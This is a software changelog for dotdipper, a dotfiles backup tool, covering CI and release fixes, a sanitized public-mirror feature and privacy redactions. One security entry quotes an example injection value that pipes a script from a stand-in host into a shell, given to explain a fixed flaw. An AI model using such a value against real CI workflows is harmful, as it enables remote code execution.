# Changelog

All notable changes to dotdipper are documented here.

## [Unreleased]

### Fixed

- **CI/CD: releases are built from the tag, not from whatever `github.ref` happens to be.** Every job re-derived the version and the checkout ref independently, and under `workflow_dispatch` that is a *branch* ref: a manual run built the tip of `main` while labelling the assets with the tag, rendered `refs/heads/main` into all four download links in the release notes, and — because `softprops/action-gh-release` was called without `tag_name` — created a second, bogus release and attached the binaries to that instead. A single `resolve` job now derives the tag, version and prerelease flag once; every other job takes them from it, checks out the tag explicitly, and refuses to release when the tag disagrees with `Cargo.toml`.
- **The Homebrew job would have destroyed the formula on its first real run.** It referenced `RELEASE_VERSION`, which was never defined anywhere. The default shell does not set `-u`, so it expanded to the empty string, and the shell performed the `>` redirection *before* the generator failed on the missing argument — truncating `Formula/dotdipper.rb` to zero bytes. The tap survived only because the commit step was skipped by the earlier failure. The formula is now generated to a temporary file, checked for macOS support, Linux support and the right version, and only then moved into place.
- **Automated tags now actually build.** `auto-release.yml` pushed its tag with `GITHUB_TOKEN`, and GitHub does not start a workflow from an event created with that token — so every automated release produced a tag with no binaries, which is why the last two releases needed tags re-pushed by hand. It now pushes with a repository-scoped deploy key, whose pushes do trigger workflows. A PAT would work too but cannot be scoped to a single repository.
- **The tap updates itself again, and says so when it cannot.** Authentication moved from an unset `HOMEBREW_TAP_TOKEN` to a deploy key scoped to the tap repository. A missing key is now a hard failure rather than a skipped step in a job that reported success — a release that shipped no formula update used to be indistinguishable from one that did.
- **Security: two shell injection sites in `auto-release.yml`.** The `version_override` dispatch input and raw commit subjects were interpolated into `run:` bodies before bash parsed them, so an input of `"; curl evil.sh | sh; "` — or a commit subject containing `$(...)` — executed in a job holding `contents: write`. Both now pass through the environment, and `version_override` is validated against a semver pattern.
- **Security: `CARGO_REGISTRY_TOKEN` was passed as a command-line argument,** making it visible in the process list to anything else in the job; log masking does not cover that. It is read from the environment now. The job also no longer hides a failure behind `continue-on-error`: it skips explicitly when no token is configured, instead of reporting success having published nothing.
- **Releases verify their own checksums.** `create-release` asserts that all four tarballs are present and that each matches its `.sha256` sidecar before publishing.
- **`--locked` everywhere.** CI and the release builds could previously resolve a dependency set different from the committed `Cargo.lock`.
- **CI runs on the branches people actually use.** The trigger was `[main, develop]`; `develop` does not exist, so feature branches got no run until a pull request opened.
- **CI covers `--no-default-features`.** `src/remote/mod.rs` has `cfg(not(feature = ...))` arms that compile in no other configuration, and `--all-features` cannot reach them.
- **The documentation job asserts something that can fail.** It checked only that two files existed. It now verifies the README documents the real install command and that the CHANGELOG has a section for the version in `Cargo.toml`.
- Added `concurrency` groups to all three workflows (two quick pushes to `main` could run `auto-release` twice and race on the push), a default `permissions: contents: read` with write granted only to the jobs that publish, `restore-keys` on every cache (a lockfile change was previously a total cold miss), the toolchain in the cache key, `actions/cache@v3` → `v4`, and a pinned, cached `cargo-audit` instead of rebuilding it from source on every run.
- `scripts/update-formula.sh` validated nothing: `sed` echoes its input unchanged when the pattern misses, so a directory named `artifacts` produced `version "artifacts"` and a formula of dead URLs, and the `[ -z "$VERSION" ]` fallback was unreachable. `scripts/build-release.sh` built only x86_64 Linux while the workflow builds both, so a local run silently produced a formula with no Linux support. `scripts/release.sh` ran `git push origin main` from whatever branch you were on.

## [0.8.0] - 2026-09-20

### Added

- **`dotdipper publish` — a sanitized public mirror alongside the private backup.** The private repo keeps everything a restore needs, including `.ssh/config`, `.gitconfig`, the Brewfile and the app manifest. `publish` derives a *second*, separate repository from the same store: paths in `[public] exclude` are withheld, the rest are rewritten by the redactors, and the finished tree is scanned before anything is written or pushed.
  - **Allowlist-driven, but the allowlist is generated for you.** `dotdipper publish --review` builds the sanitized tree and writes `public-allowlist.toml`, recording every approved path and the redactions applied to each. Publish ships only what that file lists, so a dotfile captured *after* the review is withheld and reported as pending rather than publishing itself. The file is meant to be read and committed: it is a diffable account of exactly what is public, and an entry that loses its redactions in a diff is the visible signal that a rule stopped matching. Publishing before any review has happened is refused outright.
  - **Fails closed.** Exclusion and redaction are a denylist and denylists have gaps, so a secret/PII scan runs over the sanitized output and aborts the publish on any hit. Nothing is written or pushed unless the scan is clean. Each finding gets a stable id; accept a reviewed one with `--allow-finding <id>` or `[public] allow`.
  - **Scrubs literal identity terms, not just patterns.** A bare username or device name has no regex shape, so `publish` reads the actual values (home directory owner, `$USER`, `github.username`, hostname) and removes those strings, with the scanner re-checking the same list. This is what catches things like a username baked into a shell prompt.
  - **Built-in redactors** cover git identity (including commented-out lines), the captured hostname, SSH endpoints, Tailscale MagicDNS names, absolute home paths (rewritten to `$HOME`, which also makes the public copy reusable), and email addresses. Add project rules with `[[public.redact]]`.
  - **The app inventory publishes as a generated script, not as itself.** The mirror exists so a new machine can install the same tools; the captured `Brewfile` and `apps_manifest.toml` do that but also record the machine name, capture time, the exact installed version of everything, and applications installed by hand. A version list is a vulnerability list, and the hand-installed list describes its owner rather than their toolchain. Both files are now withheld by default and an idempotent `install-apps.sh` is generated from them, carrying taps, formulae, casks, and App Store ids and nothing else. Packages under the owner's own tap are dropped and the omission stated, since leaving them in would either name the owner or — once the redactor reached them — leave a package reference that resolves to nothing. The generated script passes the same redact/scan/allowlist gate as any captured file. Also available standalone as `dotdipper install apps-script [--shareable]`, and disabled with `[public] apps_script = false`.
  - **Binary files are withheld**, not shipped, because they can be neither redacted nor meaningfully scanned.
  - `--dry-run` reports the plan, `--out DIR` writes the tree without pushing, and `github.public_repo_name` must differ from `github.repo_name` — visibility is per-repository, so a sanitized copy cannot be a branch of the private repo.

### Changed

- **Homebrew installs in one command, on Linux as well as macOS.** `brew install psyysp/dotdipper/dotdipper` taps and installs in a single step. The formula previously carried `depends_on :macos` and no `on_linux` block, so Linux users could not install at all even though every release publishes `x86_64` and `aarch64` Linux tarballs — they were built and then discarded.
- **One Homebrew formula template instead of two.** The release workflow and `scripts/update-formula.sh` each carried their own copy, and they had drifted: the script emitted Linux blocks, the workflow's macOS-only heredoc did not. Whichever ran last decided whether Linux users could install. Both now call `scripts/gen-formula.sh`. A platform with no build artifact is omitted from the formula rather than given a placeholder checksum, since a formula that names a fake hash fails at install time instead of immediately.
- `status` lists modified, added, and deleted file paths by default (previously only with `--detailed`). `--detailed` is still accepted for compatibility but is hidden from help.

### Fixed

- **The allowlist no longer publishes itself.** Its `[[withheld]]` section is a complete index of every private path and the reason each was held back — the same disclosure `manifest.lock` is excluded for, stated more legibly. It is now excluded by default under both store layouts.
- **Identity terms survive a change of machine.** They were read only from the machine doing the publishing — its login name, hostname and configured GitHub user. The moment a store outlives the machine that captured it (publishing from Linux, a second account, or after a rename) the captured machine's name was neither redacted nor flagged, because a bare username matches no pattern. `--review` now records the terms it used in the allowlist and every publish unions them back in, along with the hostname in the store's own app manifest. The terms are passed separately from the allowlist because `--review` deliberately ignores the allowlist as a path gate, and doing the same to the terms would have erased them permanently on the second machine.
- **Paths are scanned, not just contents.** A path is published as surely as the bytes under it, and it also lands in the allowlist and in every commit. A directory named after its owner or their machine now raises a finding.
- **The scanner keeps its identity terms when `builtin_redactors = false`.** That flag is a choice to stop rewriting content, not a request to stop noticing; it had been disabling the denylist and its safety net together.
- **`--allow-finding` suppresses one finding again.** Finding ids hashed only path, kind and line, so two different identity terms on the same line shared an id — allowing one silently allowed the other, and any future one on that line. The matched text is now part of the id.
- **`apps_script = false` publishes the inventory, as documented.** Withholding `Brewfile` and `apps_manifest.toml` is now a consequence of generating the script rather than a standing default, so turning the script off no longer withholds both the files and their replacement.
- **The generated script lists App Store ids without titles.** A list of purchases names its owner the same way the hand-installed applications this feature already drops do, and the script installs by id, so the titles were decoration.
- **`public.apps_script_path` is validated.** An absolute path or one containing `..` would have written outside the public tree.
- An unparsable `apps_manifest.toml` now warns instead of silently shortening the generated script, and App Store ids in a `Brewfile` are no longer discarded when no manifest is present.
- **Commit metadata no longer carries the author's identity into the public mirror.** `ensure_commit_identity` only filled in a *missing* identity, and `git config --get` resolves through the global config, so on any machine with a configured git identity it found the real name and address and left them alone. Commit metadata is not file content, so no redaction rule could reach it: the address would have shipped in every commit of the public repo. The public tree now gets a neutral identity written unconditionally, with signing disabled — a signature carries the signer's key identity too. The identity is also set in the environment, since git resolves `GIT_AUTHOR_*` and `GIT_COMMITTER_*` ahead of every config file.
- **Identity scrubbing catches the macOS possessive host prefix.** An account named `psy` yields the host `PSYs-MacBook-Air`, and shell prompts strip that `PSYs-` prefix by literal text. `\bpsy\b` does not match it, because `psy` is followed by `s`. Identity terms now accept an optional trailing `s`/`'s`, keeping both word boundaries so `psychology` is untouched. The scanner shares the pattern, so a regression fails closed rather than publishing.
- **Repository names are redacted from the published `config.toml`.** It named the owner's *private* backup repo, disclosing that it exists and what it holds, and the value is wrong for anyone reusing the config as a template.
- **Security:** bumped `rustls` 0.23.32 -> 0.23.45 for RUSTSEC-2026-0285 (TLS 1.3 handshake messages incorrectly accepted across encryption level boundaries, medium, 5.3). Reached through `reqwest` and `rust-s3`, so it affects the S3 and WebDAV remotes.
- **Untracking a file now removes it from the push.** `snapshot` only ever copied tracked files into the compiled store and never took them back out, so a path that left `tracked_files` kept its stale copy there and `git add -A` re-committed it on every push. This let a credential file survive an ignore rule that had been in place for months. `snapshot` now prunes store files the manifest no longer covers, and refuses to prune against an empty manifest so a config that fails to resolve cannot erase the backup. Store metadata (`manifest.lock`, `Brewfile`, `apps_manifest.toml`, `.gitignore`, `.git/`) and encrypted blobs are never pruned.
- **`.dotdipperignore` now governs push as well as discovery.** It previously fed only `discover`, so a pattern written there never stopped an already-tracked file from reaching GitHub — the generated `.gitignore` was built from the separate `push_ignore` list alone. Both sources now feed `resolve_push_ignored_paths`. Negation (`!`) lines from `.dotdipperignore` are dropped rather than emitted, because the merged list is sorted and a misordered negation would silently re-include an ignored file.
- **Test isolation: `init` tests no longer overwrite the real user's `.dotdipperignore`.** `cfg::init` resolves the ignore path from the base dir, which follows `$HOME`, not from `--config`. Three tests passed only `--config` and left `$HOME` unpinned, so running the suite rewrote the invoking user's ignore file with the built-in default and silently dropped every exclusion they had added. Observed twice during a live privacy sweep. Those tests now pin `HOME` and clear `XDG_CONFIG_HOME` / `DOTDIPPER_HOME`, and a regression test asserts the default lands under the pinned HOME.
- **One `.gitignore` writer instead of two.** `snapshot` and `vcs::push` each wrote the compiled store's `.gitignore` with different base content; push ran second and clobbered snapshot's version, so the two could drift unnoticed. There is now a single implementation.
- Snapshot records the compiled file hash after copy, so skipping an empty home file over a non-empty store copy cannot poison `manifest.lock`.
- `pull` refuses to check out remote 0-byte blobs over non-empty compiled files (symlink restore would empty `$HOME` immediately). Help text no longer claims `$HOME` is untouched until `--apply`.

## [0.7.5] - 2026-08-26

### Added

- **App capture promotion:** `apps capture` skips stock Apple and helper apps, treats already-installed Homebrew casks as managed (including iTerm/iterm2, zoom.us/zoom, and version suffixes), and promotes remaining apps that map to casks or known MAS ids into the Brewfile. Restore stays on Homebrew and the Mac App Store. True leftovers stay `[[unmanaged]]` with an optional `homepage`. Toggle with `[apps] promote_unmanaged` (default true).
- **macOS app capture & restore (`dotdipper apps`, macOS builds only):** `apps capture` dumps Homebrew state via `brew bundle dump` into a `Brewfile`, records Mac App Store apps (`mas list`) and scans `/Applications` + `~/Applications` into `apps_manifest.toml` (unmanaged apps flagged for manual install). Both files live in the compiled store and sync with `push`/`pull`. `apps install [--dry-run]` restores via `brew bundle`; capture runs automatically on `push` (`[apps] capture_on_push`, default true). Linux builds do not include the command.
- **Bootstrap overhaul for macOS:** generated `install_macos.sh` now installs Xcode Command Line Tools and Homebrew when missing, restores packages with `brew bundle` from the synced Brewfile (with a `mas` guard for App Store apps), and prints unmanaged apps to install manually. Legacy package-list install remains the fallback when no Brewfile exists.
- **Container e2e suite:** `scripts/container-test.sh` runs a real fresh-machine test in a Linux (Docker) container — build, push to a bare repo, pull `--apply` on a clean HOME, byte-identical restore, status clean, round-trip update, and Linux script generation.

### Fixed

- **Critical — snapshot/push no longer empties symlink-restored dotfiles.** After `apply` in symlink mode, home paths like `~/.zshrc` point at `compiled/.zshrc`. Snapshot then copied that path onto itself; `fs::copy` of a file onto the same inode truncates it to 0 bytes. Copy now skips when source and dest are the same file, and refuses to replace a non-empty file with an empty source.
- `dotdipper doctor` resolves home-relative manifest paths against `$HOME` (it previously treated `.zshrc` as relative to the current directory and failed every file).
- Generated `install.sh` no longer crashes on an unbound `$target_os` shell variable.
- `discover`/`snapshot` skip non-regular files (sockets, fifos) instead of failing.
- `push` retargets the `origin` remote when `github.repo_name` changes, and reports an error instead of claiming success when the GitHub repo/remote could not be prepared.
- Release tarballs removed from the repository (`release-v*/` now gitignored); test suite is tracked in git again.

### Previously unreleased (0.7.4 branch work, first shipped in this release)

### Added

- **SOPS secrets provider:** encrypt / decrypt / edit via the `sops` CLI with an age backend; apply decrypts `.sops.*` (and common `.enc.*`) names in-memory like `.age`.
- **Profile selection:** active profile drives `compiled/`, `manifest.lock`, and `snapshots/` under `profiles/<name>/`; `DOTDIPPER_PROFILE` overrides config; legacy top-level stores migrate into `profiles/default/`; compatibility symlinks keep `~/.config/dotdipper/compiled` working.
- **Per-profile config overlay:** `profiles/<name>/config.toml` is merged on top of the global config (overlay keys win). New profiles get a comments-only overlay so they inherit the global file.
- **Per-profile GitHub target:** push/pull/undo/clone use branch `main` for `default` and `dotdipper/<name>` otherwise. Overlay or global `[github].repo_name` can select a dedicated repository; `[github].branch` overrides the default. Branch and repo are independent.
- **`[secrets].recipients`:** multi-machine SOPS age recipients; encrypt also honors `SOPS_AGE_RECIPIENTS` / `.sops.yaml` without forcing a single local `--age`.
- **`dotdipper install script`:** print or export (`--out PATH`) `setup_dotfiles.sh` without running the full install. The generated script uses the compiled manifest (falling back to `tracked_files`, then a runtime `find`) and honors per-file `[files]` symlink/copy / exclude / `local_only` overrides.

### Changed

- `dotdipper init` scaffolds `profiles/default` and sets `active_profile = "default"`.
- `doctor` checks for `sops` when `[secrets].provider = "sops"`.
- Discover always skips the dotdipper base dir; default ignore covers all of `profiles/**`.
- Pull→apply no longer puts encrypted store names into `tracked_files`; snapshot preserves encrypted compiled blobs so consumer machines can push.
- Profile names are validated (blocks path traversal); non-default profiles are not auto-created from env typos.
- Remote push honors `DOTDIPPER_PROFILE`; remote pull uses timestamped backups and clearer profile-switch hints.
- Remote bundles omit `.git` / `.gitignore` and honor `push_ignore` / `local_only`.
- Config writes are atomic (temp file + rename). Discover writes `tracked_files` / packages to the active profile overlay.
- `dotdipper config --set` / `--edit` and `profile switch` write the global config only (overlays are not flattened).
- Dependency bumps: `tar` 0.4.46, `rust-s3` 0.37, `rustls-webpki` 0.103.14, `anyhow` 1.0.104 (cargo-audit).

### Fixed

- Apply/diff tests no longer share the runner `XDG_CONFIG_HOME` store (CI false-success / false-failure).

## [0.7.4] - 2026-07-29

### Fixed

- **Critical — pull → apply on a new machine:** `manifest.lock` is now written into `compiled/` (the git store) on every snapshot/push, and restored after `pull`.
- **Install** uses Rust `apply` (excludes/backups/manifest) instead of blindly linking every file under `compiled/`.
- **Snapshot rollback:** safety snapshot first; preserves `compiled/.git`; unique snapshot IDs with milliseconds.
- **Pull `--force`:** stashes then hard-resets the compiled store only (`$HOME` untouched unless `--apply`).
- **Prune:** `keep_age` OR-semantics fixed; `keep_size`-only no longer deletes everything.
- **Apply path traversal** rejected; encrypted apply always copies (never symlinks deleted temps).
- **Tracked file hashing** fails loudly; config expands `~`.
- **`apply` / `diff` / `pull --apply` / `install` apply** return non-zero when the manifest is missing (scripts can detect failure).
- **doctor --fix** no longer pretends to auto-repair.

### Changed

- **Default features** now include `s3` and `webdav` so release/Homebrew/AUR/Nix binaries ship remotes. Minimal builds: `--no-default-features`.
- Clear errors when S3/WebDAV are unavailable, or when `github`/`gcs` remotes are requested.
- Packaging metadata bumped to **0.7.4** (AUR, Nix, Scoop, root flake). Source/binary checksums for published artifacts still need updating when the GitHub release is cut.

### Tests

- Full e2e coverage in `tests/e2e_full_sync_test.rs` + `tests/safety_sync_test.rs`.

## [0.7.3] - 2026-03-14

### Fixed

- **CI:** Formatted `src/vcs/mod.rs` so the formatting check passes in GitHub Actions.
- **Release workflow:** The Homebrew tap update job now only runs when `HOMEBREW_TAP_TOKEN` is configured, so releases no longer fail just because that secret is missing.

## [0.7.2] - 2026-03-14

### Changed

- **Git push:** When push is rejected because the remote has commits you don't have (e.g. repo created with a README), `dotdipper push` now automatically fetches, rebases your changes onto `origin/main`, and retries the push. No need to run `dotdipper pull` first in this case.
- **Docs:** README now explains that the git repo used for push/pull lives under `~/.config/dotdipper/compiled/` and that you should use `dotdipper pull` / `dotdipper push` rather than raw `git` from `~/.config`.

## [0.7.1] - (previous release)

See GitHub releases for earlier history.
